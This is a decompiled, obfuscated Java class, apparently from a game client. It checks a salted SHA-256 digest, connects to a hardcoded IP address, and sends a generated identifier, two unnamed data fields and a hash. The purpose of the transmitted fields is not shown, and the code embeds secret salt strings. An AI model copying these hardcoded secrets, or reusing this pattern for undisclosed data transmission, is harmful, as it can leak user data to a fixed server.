package core.mchien.main2;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.UUID;
import java.util.prefs.Preferences;

public final class VDTT_c implements Runnable {
   // $FF: synthetic field
   final byte[] a;

   public VDTT_c(byte[] var1) {
      this.a = var1;
   }

   public final void run() {
      String var2;
      try {
         VDTT_b.b = new VDTT_de(this.a);
         String var1 = VDTT_b.b.c();
         short var13 = VDTT_b.b.a.readShort();
         String var3 = VDTT_b.b.c();
         byte[] var4 = VDTT_b.b.b();
         var1 = var1 + "G5G51hdgQqcDYd1yCbzV6HXqMaN1cj8WnVuO1cOm" + var13 + var3 + "C7OG0ciDgu9OUjE0KoD5nr4ZVkyU6VcGmWSzYwWA";
         byte[] var11 = MessageDigest.getInstance("SHA-256").digest(var1.getBytes(StandardCharsets.UTF_8));
         if (var4.length == var11.length) {
            for(int var6 = 0; var6 < var11.length; ++var6) {
               if (var4[var6] != var11[var6]) {
                  return;
               }
            }
         }

         VDTT_b.a = new VDTT_dt("103.232.121.105", var13);
         VDTT_b.c = new VDTT_df(VDTT_b.a.a());
         VDTT_dt var12;
         if (!((var12 = VDTT_b.a).a != null ? var12.a.isConnected() : false)) {
            return;
         }

         VDTT_df var16 = new VDTT_df();
         VDTT_b.c.a(37);
         VDTT_b.d = Preferences.userRoot().node("Java Properties");
         if ((var2 = VDTT_b.d.get("SystemId", (String)null)) == null) {
            var2 = UUID.randomUUID().toString();
            VDTT_b.d.put("SystemId", var2);
         }
         var2= "GAMERAC_RERACH_"+UUID.randomUUID().toString();
         var1 = "aea04zlvBrF2Uu88xLMyKAAcqIsBDgyN5" + DataCenter.d().u + var2 + 2 + "zhiGZvGsgiOp2Si45VWI85ZVWNHwhuJ5Yum" + DataCenter.d().v + var3 + "hgwkMqbLCoLB0CAuK778cAD4TNaACVmXKv";
         MessageDigest var14;
         (var14 = MessageDigest.getInstance("MD5")).update(var1.getBytes(StandardCharsets.UTF_8));
         var11 = var14.digest();
         var11 = MessageDigest.getInstance("SHA-256").digest(var11);
         VDTT_b.c.a(var11.length);
         var16.a(var2);
         var16.a(var3);
         var16.b(DataCenter.d().u);
         var16.b(DataCenter.d().v);
         byte[] var15 = var16.a.toByteArray();
         var16.a();
         VDTT_b.c.a(var15.length);
         VDTT_b.c.a(var15);
         VDTT_b.c.a(var11);
         VDTT_b.c.b.flush();
      } catch (Exception var9) {
         if (VDTT_b.c != null) {
            VDTT_b.c.a();
            var2 = null;
            VDTT_b.c = null;
         }

         if (VDTT_b.b != null) {
            VDTT_b.b.d();
            var2 = null;
            VDTT_b.b = null;
         }

         if (VDTT_b.a != null) {
            VDTT_b.a.b();
            var2 = null;
            VDTT_b.a = null;
         }

         return;
      } finally {
         if (VDTT_b.c != null) {
            VDTT_b.c.a();
            var2 = null;
            VDTT_b.c = null;
         }

         if (VDTT_b.b != null) {
            VDTT_b.b.d();
            var2 = null;
            VDTT_b.b = null;
         }

         if (VDTT_b.a != null) {
            VDTT_b.a.b();
            var2 = null;
            VDTT_b.a = null;
         }

      }

   }
}
